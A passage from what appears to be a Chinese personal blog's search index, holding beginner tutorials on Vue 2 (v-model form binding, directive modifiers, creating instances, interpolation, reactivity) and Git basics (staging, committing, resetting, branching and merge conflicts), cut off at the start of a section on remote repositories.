class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">用户：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;username&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;password&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;clear&quot;</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;clear&quot;</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">username</span>: <span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">password</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">clear</span>(<span class="params"></span>)&#123; <span class="comment">// 输入了内容，这两个值就会变化，通过这个函数清除内容</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">username</span> = <span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">password</span> = <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="应用于其他表单元素"><a href="#应用于其他表单元素" class="headerlink" title="应用于其他表单元素"></a>应用于其他表单元素</h2><p>常见的表单元素都可以用 v-model 绑定关联 → 快速 <strong>获取</strong> 或 <strong>设置</strong> 表单元素的值</p><p>它会根据 <strong>控件类型</strong> 自动选取 <strong>正确的方法</strong> 来更新元素</p><p>输入框  input:text   ——&gt; value<br>文本域  textarea ——&gt; value<br>复选框  input:checkbox  ——&gt; checked<br>单选框  input:radio   ——&gt; checked<br>下拉菜单 select    ——&gt; value<br>…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>小黑学习网<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    姓名：</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    是否单身：</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;isSingle&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    性别:</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;gender&quot;</span>&gt;</span>男</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;gender&quot;</span>&gt;</span>女</span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    所在城市:</span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">v-model</span>=<span class="string">&quot;city&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;101&quot;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;102&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;103&quot;</span>&gt;</span>成都<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;104&quot;</span>&gt;</span>南京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    自我描述：</span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">v-model</span>=<span class="string">&quot;desc&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>立即注册<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">isSingle</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">gender</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">city</span>: <span class="string">&#x27;101&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">desc</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240323193908.png" alt="image.png"></p><h1 id="指令修饰符"><a href="#指令修饰符" class="headerlink" title="指令修饰符"></a>指令修饰符</h1><p>通过 <code>&quot;.&quot;</code> 指明一些指令<strong>后缀</strong>，不同<strong>后缀</strong>封装了不同的处理操作 → 简化代码</p><ol><li>按键修饰符<br> <code>@keyup.enter</code> → 键盘回车监听</li><li>v-model修饰符<br> <code>v-model.trim</code> → 去除首尾空格<br> <code>v-model.number</code> → 转成数字</li><li>事件修饰符<br> <code>@事件名.stop</code> → 阻止冒泡<br> <code>@事件名.prevent</code> → 阻止默认行为<br> <code>@事件名.stop.prevent</code> → 可以连用 即阻止事件冒泡也阻止默认行为</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- @keyup.enter和v-model.trim.number的用法 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">用户：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model.trim</span>=<span class="string">&quot;username&quot;</span> @<span class="attr">keyup.enter</span>=<span class="string">&quot;clear&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">v-model.trim.number</span>=<span class="string">&quot;password&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;clear&quot;</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;clear&quot;</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> Vue.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue-概念、入门</title>
      <link href="/2024/03/22/Vue-%E6%A6%82%E5%BF%B5%E3%80%81%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/22/Vue-%E6%A6%82%E5%BF%B5%E3%80%81%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Vue-概念"><a href="#Vue-概念" class="headerlink" title="Vue 概念"></a>Vue 概念</h1><p>Vue (读音 <code>/vjuː/</code> ) 是一套 <strong>构建用户界面</strong> 的 <strong>渐进式</strong> <strong>框架</strong></p><p><strong>构建用户界面</strong>：</p><p>基于数据渲染出用户可以看见的界面</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681875887026.png" alt="1681875887026.png"></p><p><strong>渐进式</strong>：</p><p>就是循序渐进，不一定非要把Vue所以的API学完才能开发Vue，可以层层递进</p><p>Vue开发的两种方式：</p><ul><li>Vue核心包开发：局部模块改造</li><li>Vue核心包&amp;Vue插件&amp;工程化：整站开发</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240322212151.png" alt="image.png"></p><p><strong>框架</strong>：</p><p>框架就是一套完整的解决方案，相当于实现了大部分的功能，然后按照指定的规则进行编写内容</p><p><strong>优点</strong>：大大提升开发效率 (70%↑) </p><p><strong>缺点</strong>：需要理解和记忆规则，<a href="https://cn.vuejs.org/">官网</a></p><h1 id="创建Vue实例"><a href="#创建Vue实例" class="headerlink" title="创建Vue实例"></a>创建Vue实例</h1><p>通过CDN使用 Vue2&amp;Vue3 ：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--对于制作原型或学习，你可以这样使用最新版本：--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--对于生产环境，我们推荐链接到一个明确的版本号和构建文件，以避免新版本造成的不可预期的破坏：--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.16&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Vue3--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/vue@3/dist/vue.global.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>核心步骤4步：</strong></p><ol><li>准备容器</li><li>引包（<a href="https://cn.vuejs.org/">官网</a>） — 开发版本&#x2F;生产版本</li><li>创建Vue实例 <code>new Vue()</code></li><li>指定配置项，渲染数据</li></ol><ul><li><code>el</code>：指定挂载点</li><li><code>data</code>：提供数据</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123; msg &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">msg</span>: <span class="string">&#x27;Hello Vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="插值表达式"><a href="#插值表达式" class="headerlink" title="插值表达式"></a>插值表达式</h1><p>插值表达式是一种Vue的模板语法</p><p><strong>作用</strong>：利用表达式进行插值，渲染到页面中</p><p><strong>表达式</strong>：是可以被求值的代码，JS引擎会将其计算出一个结果</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 例如：</span></span><br><span class="line">money + <span class="number">100</span></span><br><span class="line">money - <span class="number">100</span></span><br><span class="line">money * <span class="number">10</span></span><br><span class="line">money / <span class="number">10</span> </span><br><span class="line">price &gt;= <span class="number">100</span> ? <span class="string">&#x27;真贵&#x27;</span>:<span class="string">&#x27;还行&#x27;</span></span><br><span class="line">obj.<span class="property">name</span></span><br><span class="line">arr[<span class="number">0</span>]</span><br><span class="line"><span class="title function_">fn</span>()</span><br><span class="line">obj.<span class="title function_">fn</span>()</span><br></pre></td></tr></table></figure><p><strong>语法</strong>：<code>&#123;&#123; 表达式 &#125;&#125;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123; msg &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;lang&quot;</span>&gt;</span> &#123;&#123; language ? &#x27;中文&#x27; : &#x27;English&#x27; &#125;&#125; <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; fn() &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意点</strong>：</p><ol><li>使用的数据必须存在 （data）</li><li>支持的是表达式，而非语句，比如：if for … </li><li>不能在标签属性中使用 <code>&#123;&#123; &#125;&#125;</code> 插值</li></ol><h1 id="响应式特性"><a href="#响应式特性" class="headerlink" title="响应式特性"></a>响应式特性</h1><p>数据的响应式处理：数据变化，视图自动更新</p><p><strong>方法</strong>：</p><ol><li>访问数据： “实例.属性名”</li><li>修改数据： “实例.属性名”&#x3D; “值”</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681888539340.png" alt="1681888539340.png"></p><ul><li>聚焦于数据 → 数据驱动视图</li><li>使用 Vue 开发，关注业务的核心逻辑，根据业务修改数据即可</li></ul><h1 id="Vue开发者工具"><a href="#Vue开发者工具" class="headerlink" title="Vue开发者工具"></a>Vue开发者工具</h1><p><strong>调试Vue应用插件</strong>：Vue Devtools</p><p>下载地址：</p><ul><li><a href="https://microsoftedge.microsoft.com/addons/detail/vuejs-devtools/olofadcdnkkjdfgjcmjaadnlehnnihnl">Edge下载</a></li><li><a href="https://chrome.zzzmh.cn/info/nhdogjmejiglipccpnnnanhbledajbpd">极简插件下载</a></li><li><a href="https://chromewebstore.google.com/detail/vuejs-devtools/nhdogjmejiglipccpnnnanhbledajbpd?hl=zh-CN&utm_source=ext_sidebar">Chrome下载</a></li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240322221618.png" alt="image.png"></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240322221713.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> Vue.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 版本控制系统</title>
      <link href="/2024/03/21/Git%20%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F/"/>
      <url>/2024/03/21/Git%20%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="Git-概念"><a href="#Git-概念" class="headerlink" title="Git 概念"></a>Git 概念</h1><p><strong>概念</strong>：<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Git">Git</a>是一个免费开源，分布式的代码版本控制系统，帮助开发团队维护代码 </p><p><strong>作用</strong>：记录代码内容，切换代码版本，多人开发时高效合并代码内容</p><p>个人本机使用：Git 基础命令和概念 </p><p>多人共享使用：团队开发同一个项目的代码版本管理</p><p>在<a href="https://git-scm.com/">Git官网下载</a></p><p><strong>验证</strong>安装是否成功：</p><ol><li>打开git bash终端</li><li>输入命令：<code>git --version</code></li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240321185748.png" alt="image.png"></p><p><strong>配置用户名和邮箱</strong>，用于每次提交代码版本时表面身份：</p><ul><li><code>git config --global user.name &quot;M78Alien&quot;</code></li><li><code>git config --global user.email &quot;1193133105@qq.com&quot;</code></li></ul><p>查看以配置的用户名和邮箱：</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240321190147.png" alt="image.png"></p><h1 id="Git-仓库"><a href="#Git-仓库" class="headerlink" title="Git 仓库"></a>Git 仓库</h1><p>Git 仓库（repository）：记录文件<strong>状态</strong>内容的地方，存储着修改的<strong>历史记录</strong> </p><p><strong>创建</strong>： </p><ol><li>把本地文件夹转换成 Git 仓库：命令 <code>git init</code></li><li>从其他服务器上克隆 Git 仓库</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240321200449.png" alt="image.png"></p><h1 id="Git-的三个区域"><a href="#Git-的三个区域" class="headerlink" title="Git 的三个区域"></a>Git 的三个区域</h1><p>Git 使用时： </p><ul><li>工作区：实际开发时操作的文件夹 </li><li>暂存区：保存之前的准备区域（暂存改动过的文件） </li><li>版本库：提交并保存暂存区中的内容，产生一个版本快照</li></ul><table><thead><tr><th><strong>命令</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>git add 文件名</td><td>暂存指定文件</td></tr><tr><td>git add .</td><td>暂存所有改动的文件</td></tr><tr><td>git commit -m “注释说明”</td><td>提交并保存，产生版本快照</td></tr></tbody></table><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230529122806613.png" alt="image-20230529122806613.png"></p><h1 id="Git-文件状态"><a href="#Git-文件状态" class="headerlink" title="Git 文件状态"></a>Git 文件状态</h1><p>Git 文件 2 种状态：</p><ul><li>未跟踪：新文件，从未被 Git 管理过</li><li>已跟踪：Git 已经知道和管理的文件</li></ul><table><thead><tr><th><strong>文件状态</strong></th><th><strong>概念</strong></th><th><strong>场景</strong></th></tr></thead><tbody><tr><td>未跟踪（U）</td><td>从未被 Git 管理过</td><td>新文件</td></tr><tr><td>新添加（A）</td><td>第一次被 Git 暂存</td><td>之前版本记录无此文件</td></tr><tr><td>未修改（’’）</td><td>三个区域统一</td><td>提交保存后</td></tr><tr><td>已修改（M）</td><td>工作区内容变化</td><td>修改了内容产生</td></tr></tbody></table><p><strong>使用</strong>：修改文件，暂存，提交保存记录，如此反复 </p><p>使用 git status -s 查看文件状态</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240321195452.png" alt="image.png"></p><p>第一列是暂存区状态</p><p>第二列是工作区状态</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240321195603.png" alt="image.png"></p><h1 id="Git-暂存区使用"><a href="#Git-暂存区使用" class="headerlink" title="Git 暂存区使用"></a>Git 暂存区使用</h1><p><strong>暂存区</strong>：暂时存储，可以临时恢复代码内容，与版本库解耦 </p><p>暂存区 -&gt; 覆盖 -&gt; 工作区，命令：<code>git restore 目标文件</code>（注意：完全确认覆盖时使用） </p><p>从暂存区移除文件，命令：<code>git rm --cached 目标文件</code></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230529123430435.png" alt="image-20230529123430435.png"></p><h1 id="Git-版本退回"><a href="#Git-版本退回" class="headerlink" title="Git 版本退回"></a>Git 版本退回</h1><p><strong>概念</strong>：把版本库某个版本对应的内容快照，恢复到工作区&#x2F;暂存区 </p><p>查看提交历史：<code>git log --oneline</code></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240321200903.png" alt="image.png"></p><p><strong>回退命令</strong>： </p><ul><li><code>git reset --soft 版本号</code>（其他文件未跟踪） </li><li><code>git reset --hard 版本号</code></li><li><code>git reset --mixed 版本号</code> （与 git reset 等价）</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230529123953391.png" alt="image-20230529123953391.png"></p><p>注意：</p><ol><li>只有记录在版本库的提交记录才能恢复</li><li>回退后，继续修改-&gt;暂存-&gt;提交操作即可（产生新的提交记录过程）</li></ol><h1 id="Git-删除文件"><a href="#Git-删除文件" class="headerlink" title="Git 删除文件"></a>Git 删除文件</h1><p><strong>步骤</strong>：</p><ol><li>手动删除工作区文件</li><li>暂存变更<code>git add .</code>手动删除暂存区文件造成变更，</li><li>提交保存</li></ol><p><strong>总结</strong>：工作区只要改变，都可以暂存提交产生新记录</p><h1 id="Git-忽略文件"><a href="#Git-忽略文件" class="headerlink" title="Git 忽略文件"></a>Git 忽略文件</h1><p><strong>概念</strong>：<code>.gitignore</code> 文件可以让 git 彻底忽略跟踪指定文件 </p><p><strong>目的</strong>：让 git 仓库更小更快，避免重复无意义的文件管理 </p><p>例如： </p><ol><li>系统或软件自动生成的文件 </li><li>编译产生的结果文件 </li><li>运行时生成的日志文件，缓存文件，临时文件等 </li><li>涉密文件，密码，秘钥等文件</li></ol><p><strong>创建</strong>： </p><ol><li>项目根目录新建 <code>.gitignore</code> 文件</li><li>填入相应配置来忽略指定文件</li></ol><p>注意：如果文件已经被暂存区跟踪过，可以从暂存区移除即可</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230529124342264.png" alt="image-20230529124342264.png"></p><h1 id="Git-分支"><a href="#Git-分支" class="headerlink" title="Git 分支"></a>Git 分支</h1><p><strong>概念</strong>：本质上是指向<strong>提交节点</strong>的可变<strong>指针</strong>，默认名字是 master</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230529124358139.png" alt="image-20230529124358139.png"></p><p><strong>注意</strong>：<strong>HEAD 指针影响工作区&#x2F;暂存区的代码状态</strong></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230529124411556.png" alt="image-20230529124411556.png"></p><p><strong>步骤</strong>：</p><ol><li>创建分支命令：<code>git branch 分支名</code></li><li>切换分支命令：<code>git checkout 分支名</code></li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230529124440884.png" alt="image-20230529124440884.png"></p><h2 id="合并与删除"><a href="#合并与删除" class="headerlink" title="合并与删除"></a>合并与删除</h2><p>把分支合并回到 master 分支并删除分支节点</p><p><strong>步骤</strong>：</p><ol><li>切回到要合入的分支上：<code>git checkout master</code></li><li>合并其他分支过来：<code>git merge 被合并的分支名</code></li><li>删除合并后的分支指针：<code>git branch -d 被合并的分支名</code></li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230529124941866.png" alt="image-20230529124941866.png"></p><h2 id="合并与提交"><a href="#合并与提交" class="headerlink" title="合并与提交"></a>合并与提交</h2><p>合并提交：发生于原分支产生了新的提交记录后，再合并回去时发生，自动使用多个快照记录合并后产生一次新的提交</p><p><strong>步骤</strong>：</p><ol><li>切回到要合入的分支上：<code>git checkout master</code></li><li>合并其他分支过来：<code>git merge 被合并的分支名</code></li><li>删除合并后的分支：<code>git branch -d 被合并的分支名</code></li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230529125317433.png" alt="image-20230529125317433.png"></p><p><strong>注意</strong>：最后合并回到主分支上时，提交记录流程图的顺序按照产生的先后顺序排列，而非合并的先后顺序</p><h2 id="合并冲突"><a href="#合并冲突" class="headerlink" title="合并冲突"></a>合并冲突</h2><p>状况1：基于 master 新建 publish 分支，完成发布文章业务，然后修改内容页面的 html 文件的 title 标签，并提交一次</p><p>状况2：切换到 master，也在修改内容页面的 html 文件的 title 标签，并提交一次</p><p><strong>冲突</strong>：把 publish 分支合并到 master 回来，产生合并冲突</p><p><strong>概念</strong>：不同分支中，对同一个文件的同一部分修改，Git 无法干净的合并，产生合并冲突</p><p><strong>解决</strong>：</p><ol><li>打开 VSCode 找到冲突文件并手动解决</li><li>解决后需要提交一次记录</li></ol><p><strong>避免</strong>：（多交流）</p><ol><li>按页面划分不同分支开发</li><li>公共代码在统一文件夹维护</li><li>Node等软件版本统一，npm 包统一下载</li></ol><h1 id="Git-远程仓库"><a href="#Git-远程仓库" class="headerlink" title="Git 远程仓库"></a>Git 